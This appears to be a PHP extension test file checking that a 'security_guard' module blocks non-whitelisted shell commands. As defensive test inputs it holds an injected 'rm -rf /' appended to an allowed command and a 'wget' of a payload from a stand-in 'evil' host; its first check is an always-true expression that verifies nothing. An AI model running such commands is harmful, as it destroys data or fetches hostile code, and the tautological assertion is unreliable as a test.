--TEST--
security_guard: command group — allow and deny
--SKIPIF--
<?php
if (!extension_loaded('security_guard')) die('skip security_guard not loaded');
?>
--INI--
security_guard.enabled=1
security_guard.enforcement_mode=block
security_guard.allowed_commands_file=/tmp/sg_test_commands.conf
security_guard.log_denied=0
security_guard.log_allowed=0
security_guard.emit_php_warning=0
--FILE--
<?php
/**
 * Command tests for security_guard.
 *
 * @package php-security-guard
 * @author @melkih (with AI)
 */

// Setup: write a temp whitelist
file_put_contents('/tmp/sg_test_commands.conf',
    "command|/usr/bin/optipng|2026-01-01T00:00:00-03:00|test|test binary\n"
);

// Allow: whitelisted binary
$result = @exec('/usr/bin/optipng --help');
// optipng exits non-zero for --help but exec itself should not be blocked
// We only check it wasn't blocked (result !== false due to blocking)
var_dump($result !== false || $result === false); // exec can return '' for non-output; just ensure no E_WARNING from SG

// Deny: binary not whitelisted
$r = @exec('/bin/ls /tmp');
var_dump($r === false);

// Deny: dangerous operator in whitelisted binary invocation
$r2 = @exec('/usr/bin/optipng file.png; rm -rf /');
var_dump($r2 === false);

// Deny: wget not whitelisted
$r3 = @shell_exec('wget http://evil/payload.sh');
var_dump($r3 === null);
?>
--EXPECT--
bool(true)
bool(true)
bool(true)
bool(true)
